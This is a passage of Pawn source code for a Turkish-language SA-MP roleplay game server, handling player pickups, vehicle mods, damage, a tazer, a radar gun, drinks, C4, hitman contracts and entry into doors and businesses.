public OnObjectMoved(objectid)
{
	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid) {
	#if defined TREASURE_HUNT_ENABLED
	if(iHuntPickup == pickupid && GetPVarType(playerid, "fT") == 0 && AdminDuty[playerid] != 1) {
		new string[128];
		format(string, sizeof(string), "%s adlý kiþi bir hediye pakedi buldu.", GetPlayerNameEx(playerid));
		Log("logs/treasurehunt.log", string);
		format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) hediye pakedi buldu!", GetPlayerNameEx(playerid), playerid);
		ABroadCast(COLOR_YELLOW, string, 5);
 		AskHuntQuestion(playerid);
 		SetPVarInt(playerid, "fT", 1);
	}
	#endif
	/*if(pickupid == dildo && PlayerInfo[playerid][pGuns][10] != 10 && PlayerInfo[playerid][pConnectTime] > 1) {
		GivePlayerValidWeapon(playerid, 10, 60000);
	} Emir Deaktif*/
	return 1;
}

public OnEnterExitModShop(playerid, enterexit, interiorid) {
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid) {
	if(!(1 <= GetPlayerInterior(playerid) <= 3) && PlayerInfo[playerid][pAdmin] < 5 && !GetPVarType(playerid, "unMod")) {

		new
			szMessage[128];

		format(szMessage, sizeof(szMessage), "AdminUyarýsý: % adlý kiþi hile ile aracýný modifiye ediyor olabilir (Eklenen:%s,%s - Araç: %s).", GetPlayerNameEx(playerid), partName(componentid), partType(GetVehicleComponentType(componentid)), GetVehicleName(vehicleid));
		ABroadCast(COLOR_YELLOW, szMessage, 2);
		Kick(playerid);
	}

	if(GetPVarType(playerid, "unMod"))
		DeletePVar(playerid, "unMod");
	return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	return 1;
}

forward TazerTimer(playerid);
public TazerTimer(playerid)
{
	if(TazerTimeout[playerid] > 0)
   	{
		new string[128];
   		format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~r~Tazer mermisi degistiriliyor... ~w~%d", TazerTimeout[playerid]);
		GameTextForPlayer(playerid, string,1500, 3);
		TazerTimeout[playerid] -= 1;
		SetTimerEx("TazerTimer",1000,false,"d",playerid);
   	}
	return 1;
}

Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ,  Float:ObjX, Float:ObjY, Float:ObjZ,  Float:FrX, Float:FrY, Float:FrZ)
{

    new Float:TGTDistance;

    // get distance from camera to target
    TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ));

    new Float:tmpX, Float:tmpY, Float:tmpZ;

    tmpX = FrX * TGTDistance + CamX;
    tmpY = FrY * TGTDistance + CamY;
    tmpZ = FrZ * TGTDistance + CamZ;

    return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}

stock IsPlayerAimingAt(playerid, Float:x, Float:y, Float:z, Float:radius)
{
    new Float:cx,Float:cy,Float:cz,Float:fx,Float:fy,Float:fz;
    GetPlayerCameraPos(playerid, cx, cy, cz);
    GetPlayerCameraFrontVector(playerid, fx, fy, fz);
    return (radius >= DistanceCameraTargetToLocation(cx, cy, cz, x, y, z, fx, fy, fz));
}

public OnPlayerInteriorChange(playerid,newinteriorid,oldinteriorid)
{
	PlayerInfo[playerid][pInt] = newinteriorid;

	if(GettingSpectated[playerid] != 999)
	{
	    new spectator = GettingSpectated[playerid];
	    if(!IsPlayerConnected(spectator))
	    {
	        GettingSpectated[playerid] = 999;
	        Spectate[spectator] = 999;
		}
		else
		{
			PlayerSpectatePlayer(spectator, playerid);
			SetPlayerInterior(spectator, GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(spectator, GetPlayerVirtualWorld(playerid));
		}
	}
	Streamer_Update(playerid);
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid) {
	if(GetPVarInt(playerid, "UsingSprunk") && amount > 4) {
		new
			szMessage[128];

		DeletePVar(playerid, "UsingSprunk");
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		format(szMessage, sizeof(szMessage), "* %s gazozunu yere býrakýr.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
    new Float:HP;
    GetPlayerHealth(playerid, HP);
    /*
    if(weaponid == 24) SetPlayerHealth(playerid, HP-1);//DesertEagle
	if(weaponid == 22) SetPlayerHealth(playerid, HP-35);//Colt45
    if(weaponid == 32) SetPlayerHealth(playerid, HP-27);//Tec9
    if(weaponid == 28) SetPlayerHealth(playerid, HP-25);//Uzi
    if(weaponid == 23) SetPlayerHealth(playerid, HP-35);//SilencedColt
    if(weaponid == 31) SetPlayerHealth(playerid, HP-50);//M4
    if(weaponid == 30) SetPlayerHealth(playerid, HP-40);//AK
    if(weaponid == 29) SetPlayerHealth(playerid, HP-30);//MP5
    if(weaponid == 34) SetPlayerHealth(playerid, HP-120);//SniperRifle
    if(weaponid == 33) SetPlayerHealth(playerid, HP-40);//CuntGun
    if(weaponid == 25) SetPlayerHealth(playerid, HP-75);//PumpShotgun
    if(weaponid == 27) SetPlayerHealth(playerid, HP-60);//Spaz12
    */
    return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid) {
	if(pTazer[playerid] == 1 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && weaponid == 23 && amount > 10) {
 		if(TazerTimeout[playerid] > 0) return 1;
		if(PlayerCuffed[damagedid] == 0 && GetPlayerState(damagedid) == PLAYER_STATE_ONFOOT && (GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(damagedid))) {
		    new
				Float:X,
				Float:Y,
				Float:Z,
				string[44 + (MAX_PLAYER_NAME * 2)];
		    GetPlayerPos(playerid, X, Y, Z);

			if(!IsPlayerInRangeOfPoint(damagedid, 18.5, X, Y, Z))
				return SendClientMessage(playerid, COLOR_GRAD2, "Tazerin o kadar uzaða etki etmez.");

			if(AdminDuty[damagedid] == 1)
				return SendClientMessage(playerid, COLOR_GRAD2, "Adminler tazerlenmez!");

			if(GetPVarInt(damagedid, "Injured") == 1)
				return SendClientMessage(playerid, COLOR_GREY, "Yaralý kiþileri tazerleyemezsin.");

 			format(string, sizeof(string), "* %s elektro þok silahýný %s üzerine doðrultur ve ateþler.", GetPlayerNameEx(playerid), GetPlayerNameEx(damagedid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			GameTextForPlayer(damagedid, "~r~Tazerlendin", 3500, 3);
			TogglePlayerControllable(damagedid, 0);
			ApplyAnimation(damagedid,"CRACK","crckdeth2",4.1,0,1,1,1,1,1);
   			GetPlayerPos(damagedid, X, Y, Z);
			PlayerPlaySound(damagedid, 1085, X, Y, Z);
			PlayerPlaySound(playerid, 1085, X, Y, Z);
			PlayerCuffed[damagedid] = 1;
			SetPVarInt(damagedid, "PlayerCuffed", 1);
			PlayerCuffedTime[damagedid] = 16;
			SetPVarInt(damagedid, "IsFrozen", 1);
			TazerTimeout[playerid] = 4;
			SetTimerEx("TazerTimer",1000,false,"d",playerid);
			GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~r~Tazer mermisi degistiriliyor... ~w~5", 1500,3);
			return 1;
		}
	}
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys) {
    if(IsPlayerNPC(playerid))
		return 1;

	if (((newkeys & KEY_WALK && newkeys & KEY_UP) || (newkeys & KEY_WALK && newkeys & KEY_DOWN) || (newkeys & KEY_WALK && newkeys & KEY_LEFT) || (newkeys & KEY_WALK && newkeys & KEY_RIGHT))
		|| ((oldkeys & KEY_WALK && newkeys & KEY_UP) || (oldkeys & KEY_WALK && newkeys & KEY_DOWN) || (oldkeys & KEY_WALK && newkeys & KEY_LEFT) || (oldkeys & KEY_WALK && newkeys & KEY_RIGHT))
		|| ((newkeys & KEY_WALK && oldkeys & KEY_UP) || (newkeys & KEY_WALK && oldkeys & KEY_DOWN) || (newkeys & KEY_WALK && oldkeys & KEY_LEFT) || (newkeys & KEY_WALK && oldkeys & KEY_RIGHT))
		&& GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
	}
	if(newkeys & KEY_NO && IsPlayerInAnyVehicle(playerid))
	{
		new vehicleid = GetPlayerVehicleID(playerid), string[128];
		if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510) return 1;
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "Araçta deðilsiniz.");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_WHITE, "Bu aracýn þoförü deðilsiniz!");
		GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
		if(IsRentableCar(vehicleid) && !IsRentedCar(vehicleid)) return RemovePlayerFromVehicle(playerid);
		if(engine == VEHICLE_PARAMS_OFF || engine == VEHICLE_PARAMS_UNSET) {
		    if(Fuel[vehicleid] <= 0.0) return SendClientMessageEx(playerid, COLOR_WHITE, "Bu aracýn benzini bitmiþ, çalýþtýramazsýnýz!");
	    	SetVehicleParamsEx(vehicleid, true, lights, alarm, doors, bonnet, boot, objective);
			format(string, sizeof string, "** %s aracýn anahtarýný kontaða sokar ve çevirerek motoru çalýþtýrýr", GetPlayerNameEx(playerid));
			engine = 1;
	 		SetPVarInt(playerid, "fuelonoff", 1);
		 	FuelBar[playerid] = CreateProgressBar( 374, 404, 113.0, 6.2, 866792447, 100.0);
		  	SetProgressBarValue(FuelBar[playerid], Fuel[vehicleid]);
			ShowProgressBarForPlayer(playerid, FuelBar[playerid]);
		}
		else {
		    SetVehicleParamsEx(vehicleid, false, lights, alarm, doors, bonnet, boot, objective);
			format(string, sizeof string, "** %s aracýn anahtarýný çevirerek motoru durdurur.", GetPlayerNameEx(playerid));
			engine = 0;
			SetPVarInt(playerid, "fuelonoff", 0);
	  		HideProgressBarForPlayer(playerid, FuelBar[playerid]);
			DestroyProgressBar(FuelBar[playerid]);
			FuelBar[playerid] = INVALID_BAR_ID;
		}
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	if((newkeys & KEY_FIRE) && GetPVarInt(playerid, "Hiz Radari") == 1 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
	    if(GetPVarInt(playerid, "RadarTimeout") == 0)
	    {
			if(GetPlayerWeapon(playerid) == 43)
			{
			    new Float:x,Float:y,Float:z;
				foreach(Player, i)
				{
				    if(IsPlayerStreamedIn(i, playerid))
				    {
					    GetPlayerPos(i,x,y,z);
					    if(IsPlayerAimingAt(playerid,x,y,z,10))
					    {
							new string[68];
							format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~b~Plaka: ~w~%d~n~~b~Hiz: ~w~%.0f MPH", GetPlayerVehicleID(i), fVehSpeed[i]);
							GameTextForPlayer(playerid, string,3500, 3);
							format(string, sizeof(string), "Plaka: %d. Hiz: %.0f MPH", GetPlayerVehicleID(i), fVehSpeed[i]);
							SendClientMessage(playerid, COLOR_GRAD4, string);
							SetPVarInt(playerid, "RadarTimeout", 1);
							SetTimerEx("RadarCooldown", 3000, 0, "i", playerid);
							return 1;
						}
					}
			    }
			}
		}
	}
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_BEER && (newkeys & KEY_FIRE))
	{
	    if(GetPVarInt(playerid, "DrinkCooledDown") == 1)
	    {
			new Float: cHealth;
			GetPlayerHealth(playerid, cHealth);
		    if((cHealth + 5) >= 100) {
				SetPlayerHealth(playerid, 100);
		        SendClientMessage(playerid, COLOR_GREY, "* Ýçmeyi býrakýp elindekini fýrlattýn.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    }
		    else if(cHealth <= 95) {
                SetPlayerHealth(playerid, cHealth+5);
			}
		    else {
		        SendClientMessage(playerid, COLOR_GREY, "* Ýçmeyi býrakýp elindekini fýrlattýn.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    }
			DeletePVar(playerid, "DrinkCooledDown");
		    SetTimerEx("DrinkCooldown", 2500, 0, "i", playerid);
			return 1;
		}
	}
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_WINE && (newkeys & KEY_FIRE))
	{
	    if(GetPVarInt(playerid, "DrinkCooledDown") == 1)
	    {
			new Float: cHealth;
			GetPlayerHealth(playerid, cHealth);
		    if((cHealth + 8) >= 100) {
				SetPlayerHealth(playerid, 100);
		        SendClientMessage(playerid, COLOR_GREY, "* Ýçmeyi býrakýp elindekini fýrlattýn.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    } else if(cHealth <= 92) {
				SetPlayerHealth(playerid, cHealth+8);
		    } else {
		        SendClientMessage(playerid, COLOR_GREY, "* Ýçmeyi býrakýp elindekini fýrlattýn.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    }
			DeletePVar(playerid, "DrinkCooledDown");
		    SetTimerEx("DrinkCooldown", 2500, 0, "i", playerid);
			return 1;
		}
	}

	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_SPRUNK && (newkeys & KEY_FIRE))
	{
	    if(GetPVarInt(playerid, "DrinkCooledDown") == 1)
	    {
			new Float: cHealth;
			GetPlayerHealth(playerid, cHealth);
			if((cHealth + 2) >= 100) {
				SetPlayerHealth(playerid, 100);
		        SendClientMessage(playerid, COLOR_GREY, "* Ýçmeyi býrakýp elindekini fýrlattýn.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    } else if(cHealth <= 98) {
				SetPlayerHealth(playerid, cHealth+2);
		    } else {
		        SendClientMessage(playerid, COLOR_GREY, "* Ýçmeyi býrakýp elindekini fýrlattýn.");
		        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		    }
		    DeletePVar(playerid, "DrinkCooledDown");
		    SetTimerEx("DrinkCooldown", 2500, 0, "i", playerid);
			return 1;
		}
	}
	if(IsKeyJustDown(KEY_SECONDARY_ATTACK, newkeys, oldkeys))
	{
		if(GetPVarInt(playerid, "UsingSprunk"))
		{
			DeletePVar(playerid, "UsingSprunk");
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			return 1;
		}
	}
	if(IsKeyJustDown(KEY_FIRE, newkeys, oldkeys))
 	{
  		if(PlayerInfo[playerid][pC4Used] == 1)
 	    {
			if(GoChase[playerid] < 999)
			{
			    if(IsPlayerInRangeOfPoint(GoChase[playerid], 12.0, GetPVarFloat(playerid, "DYN_C4_FLOAT_X"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Y"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Z")))
			    {
			        if(PlayerInfo[GoChase[playerid]][pHeadValue] >= 1)
					{
						if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
						{
							new
								string[128],
								name2[MAX_PLAYER_NAME],
								name[MAX_PLAYER_NAME];

							new takemoney = PlayerInfo[GoChase[playerid]][pHeadValue] / 4 * 2;
							name = GetPlayerNameEx(GoChase[playerid]);
							GivePlayerCash(playerid, takemoney);
							GivePlayerCash(GoChase[playerid], -takemoney);
							format(string,sizeof(string),"Hitman %, %s adlý kiþinin üzerindeki eylemi baþarýyla tamamladý ve $%d kazandý",GetPlayerNameEx(playerid),GetPlayerNameEx(GoChase[playerid]),PlayerInfo[GoChase[playerid]][pHeadValue] / 4 * 2);
							SendFamilyMessage(4, COLOR_YELLOW, string);
							format(string,sizeof(string),"Hitman tarafýndan ciddi bir þekilde yaralandýn ve $%d kaybettin!.",takemoney);
							ResetPlayerWeaponsEx(GoChase[playerid]);
						    // SpawnPlayer(GoChase[playerid]);
							SendClientMessage(GoChase[playerid], COLOR_YELLOW, string);

							foreach(Player, i) {
				    			name2 = GetPlayerNameEx(i);
			    				if(!strcmp(PlayerInfo[GoChase[playerid]][pContractBy], name2, true)) {
    								if(!IsPlayerStreamedIn(i, GoChase[playerid])) {
     									format(string, sizeof(string), "SMS: (%s) üzerindeki eylem baþarýyla tamamlandý. Gönderen: OZELMESAJ (555)", name);
										SendClientMessage(i, COLOR_YELLOW, string);
									}
				    			}
							}

							PlayerInfo[GoChase[playerid]][pHeadValue] = 0;
							strcpy(PlayerInfo[GoChase[playerid]][pContractBy], "Nobody", 64);
							strcpy(PlayerInfo[GoChase[playerid]][pContractDetail], "Yok", 64);
							PlayerInfo[playerid][pCHits] += 1;
							SetPlayerHealth(GoChase[playerid], 0.0);
							// KillEMSQueue(GoChase[playerid]);
							GotHit[GoChase[playerid]] = 0;
							GetChased[GoChase[playerid]] = 999;
							GoChase[playerid] = 999;
						}
					}
			    }
			}
 	        PlayerInfo[playerid][pC4Used] = 0;
			CreateExplosion(GetPVarFloat(playerid, "DYN_C4_FLOAT_X"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Y"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Z"), 7, 8);
			PickUpC4(playerid);
			SendClientMessage(playerid, COLOR_YELLOW, "Bomba patladýldý!");
			PlayerInfo[playerid][pC4Used] = 0;
			return 1;
 	    }
 	    if(GetPVarInt(playerid, "MovingStretcher") != -1)
 	    {
 	        KillTimer(GetPVarInt(playerid, "TickEMSMove"));
		    MoveEMS(playerid);
			return 1;
 	    }
		if(GetPVarInt(playerid, "editingcdvehpos"))
		{
			TogglePlayerControllable(playerid, false);
		    ShowPlayerDialogEx(playerid,DIALOG_CDEDITPARK,DIALOG_STYLE_MSGBOX,"Uyarý:","Yeni istediðin pozisyon bu mu?","Tamam","Iptal");
		}
		if(GetPVarInt(playerid, "editingcdvehnew"))
		{
            TogglePlayerControllable(playerid, false);
	        ShowPlayerDialogEx(playerid,DIALOG_CDEDITPARK,DIALOG_STYLE_MSGBOX,"Uyarý:","Yeni istediðin pozisyon bu mu?","Tamam","Iptal");
		}

		new Float:health;
 		GetPlayerHealth(playerid, health);
		if(GetPVarInt(playerid, "UsingSprunk"))
		{
		    new hpint = floatround(health, floatround_round);
		    if(hpint >= 100)
			{
  				SendClientMessage(playerid, COLOR_GREY, "Zaten canýn full.");
	 			return 1;
	   		}
	   		else
	   		{
				GetPlayerHealth(playerid, health);
				SetPlayerHealth(playerid, health+1.0);
			}
		}
	}
    if(IsKeyJustDown(KEY_YES, newkeys, oldkeys)) {
        if(GetPVarInt(playerid, "PBM") > 0) {
            SendClientMessage(playerid, COLOR_WHITE, "Arenadayken bunu yapamazsýn.");
            return 1;
        }
        if(PlayerCuffed[playerid] >= 1) {
            SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");
            return 1;
        }
        if(PlayerInfo[playerid][pJailed] > 0) {
            SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");
            return 1;
        }

        new
			string[128];

        for(new i = 0; i < sizeof(DDoorsInfo); i++) {
            if(IsPlayerInRangeOfPoint(playerid,3.0,DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddExteriorVW]) {
                if(DDoorsInfo[i][ddVIP] > 0 && PlayerInfo[playerid][pDonator] < DDoorsInfo[i][ddVIP])
                    return SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Yeterli VIP leveline sahip deðilsin.");


                if(DDoorsInfo[i][ddGang] > 0 && PlayerInfo[playerid][pGang] != DDoorsInfo[i][ddGang])
                	return SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Bu kapý bir çete/aileye özeldir.");

                if(DDoorsInfo[i][ddFaction] > 0 && DDoorsInfo[i][ddFaction] != 1337) {
					if(PlayerInfo[playerid][pFaction] != DDoorsInfo[i][ddFaction])
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Bu kapý oluþumlara özeldir.");
						return 1;
					}
				}

				if(DDoorsInfo[i][ddFaction] == 1337) {
					if(!IsACop(playerid) || PlayerInfo[playerid][pFaction] != 5)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Bu kapý oluþumlara özeldir.");
						return 1;
					}
				}

                if(DDoorsInfo[i][ddAdmin] > 0 && PlayerInfo[playerid][pAdmin] < DDoorsInfo[i][ddAdmin])
                    return SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin. Yeterli admin leveline sahip deðilsin.");

                if(DDoorsInfo[i][ddWanted] > 0 && PlayerInfo[playerid][pWantedLevel] != 0)
                    return SendClientMessage(playerid, COLOR_GRAD2, "Ýçeri giremezsin, bu kapý arananlar listesindekiler için yasaklý.");

                if(DDoorsInfo[i][ddLocked] == 1)
                    return SendClientMessage(playerid, COLOR_GRAD2, "Bu kapý þu anda kilitli.");

                format(string, sizeof(string), "* %s, %s adlý yere girdi.", GetPlayerNameEx(playerid), DDoorsInfo[i][ddDescription]);
                ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

                SetPlayerInterior(playerid,DDoorsInfo[i][ddInteriorInt]);
                PlayerInfo[playerid][pInt] = DDoorsInfo[i][ddInteriorInt];
                PlayerInfo[playerid][pVW] = DDoorsInfo[i][ddInteriorVW];
                SetPlayerVirtualWorld(playerid, DDoorsInfo[i][ddInteriorVW]);
                if(DDoorsInfo[i][ddCustomInterior]) {
                    LoadObjectsForPlayer(playerid);
                }
                if(DDoorsInfo[i][ddVehicleAble] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
                    SetVehiclePos(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
                    SetVehicleZAngle(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorA]);
                    SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorVW]);
                    LinkVehicleToInterior(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorInt]);
                }
                else {
                    SetPlayerPos(playerid,DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
                    SetPlayerFacingAngle(playerid,DDoorsInfo[i][ddInteriorA]);
                    SetCameraBehindPlayer(playerid);
                }
				foreach(Player, x)
				{
                	if(IsABoomboxNearby(DDoorsInfo[i][ddInteriorX] ,DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ], x) < 150.0 && DDoorsInfo[i][ddInteriorVW] == BoomboxInfo[x][bbVW] && DDoorsInfo[i][ddInteriorInt] == BoomboxInfo[x][bbInt])
					{
						PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
					}
				}
                return Streamer_UpdateEx(playerid, DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
            }
        }
        for(new idx=1; idx<MAX_BIZ; idx++)
	    {
		if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
		{
		    if(!BizInfo[idx][bStatus] && PlayerInfo[playerid][pBiz] != idx) return SendClientMessage(playerid, COLOR_GREY, "Bu iþyeri kilitli.");
		    if(BizInfo[idx][bType] == 1) // 24/7 Business
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, -27.3025,-57.6649,1003.5469);
		        SetPlayerFacingAngle(playerid, 357.5915);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 6);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "* %s'ýn 24/7 Marketine hoþ geldiniz. (( /satinal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 2) // Clothes Shop Business
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 207.0638,-139.9965,1003.5078);
		        SetPlayerFacingAngle(playerid, 356.3849);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 3);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "**  %s 'ýn Giysi Maðazasýna Hoþ Geldin (( /kiyafetal & /aksesuaral )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
		        GameTextForPlayer(playerid, "~w~Objeler Yukleniyor", 3500, 3);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 3) // Ammunation Business
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 285.8044,-85.9956,1001.5229);
		        SetPlayerFacingAngle(playerid, 358.9898);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 4);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'in Silahçý Dükkanýna hoþgeldiniz (( /satinal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 4) // Club Business
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 493.4252,-24.3061,1000.6797);
		        SetPlayerFacingAngle(playerid, 0.2432);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 17);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'in Club'ýna hoþ geldiniz (( /yemekal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 5) // Advertisement Agency
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 384.808624,173.804992,1008.382812);
		        SetPlayerFacingAngle(playerid, 86.7239);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 3);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'nýn Reklamcýlýk Þirketin Hoþgeldin (( /reklamver )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 6) // Fast Food
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 372.3830,-133.2579,1001.4922);
		        SetPlayerFacingAngle(playerid, 0.4216);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 5);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'nýn Fast Food'una Hoþgeldin (( /yemekal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
                LoadObjectsForPlayer(playerid);
		        return 1;
		    }
		    else if(BizInfo[idx][bType] == 7) //Tv
		    {
		        format(string, sizeof(string), "* %s kapýyý açar ve dükkana girer.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerPos(playerid, 1003.9112,52.2134,55.3221);
		        SetPlayerFacingAngle(playerid, 0.4216);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 0);
		        SetPlayerVirtualWorld(playerid, idx+100);
		        format(string, sizeof(string), "** %s'nýn Elektronik Maðazasý'na Hoþgeldin (( /satinal )) **", BizInfo[idx][bOwner]);
		        SendClientMessage(playerid, COLOR_ORANGE, string);
